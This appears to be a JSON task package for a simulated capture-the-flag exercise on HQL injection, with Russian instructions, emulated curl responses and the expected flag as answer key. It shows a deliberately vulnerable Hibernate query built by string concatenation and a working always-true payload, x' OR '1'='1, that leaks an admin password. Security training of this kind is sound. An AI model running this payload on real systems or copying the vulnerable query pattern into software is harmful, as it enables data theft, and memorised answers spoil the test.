@@ -1,0 +1,39 @@
+{
+  "id": "web-orm-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{hql_c0nc4t3n4t10n_l34ks}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: ORM/HQL-инъекция\n\nЦель — `https://api.example/users` (Spring Boot + Hibernate). В коде сервера\nпараметр `name` склеивается в HQL:\n\n    createQuery(\"FROM User u WHERE u.username = '\" + name + \"'\")\n\nЗадача: выйди за пределы фильтра и достань секрет администратора.\n\n1. Обычный запрос: `curl -s 'https://api.example/users?name=alice'`.\n2. HQL принимает булево условие. Сломай кавычку и добавь всегда истинное:\n   `curl -s -G https://api.example/users --data-urlencode \"name=x' OR '1'='1\"`.\n3. Ответ вернёт всех пользователей, включая `admin` с полем `password`.\n4. Достань флаг: `... | grep 'nto{' > found.txt`, затем `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция api.example/users)",
+      "cases": [
+        {
+          "match": "name=.*(or|OR).*1.*=.*1|name=.*or.*1",
+          "example": "-s -G https://api.example/users --data-urlencode \"name=x' OR '1'='1\"",
+          "output": "id=1 username=alice role=user\nid=2 username=admin role=admin password=nto{hql_c0nc4t3n4t10n_l34ks}\n"
+        },
+        {
+          "match": "name=alice",
+          "example": "-s 'https://api.example/users?name=alice'",
+          "output": "id=1 username=alice role=user\n"
+        },
+        {
+          "match": "name=",
+          "example": "-s 'https://api.example/users?name=bob'",
+          "output": "id=3 username=bob role=user\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только GET https://api.example/users?name=.\n"
+    }
+  }
+}
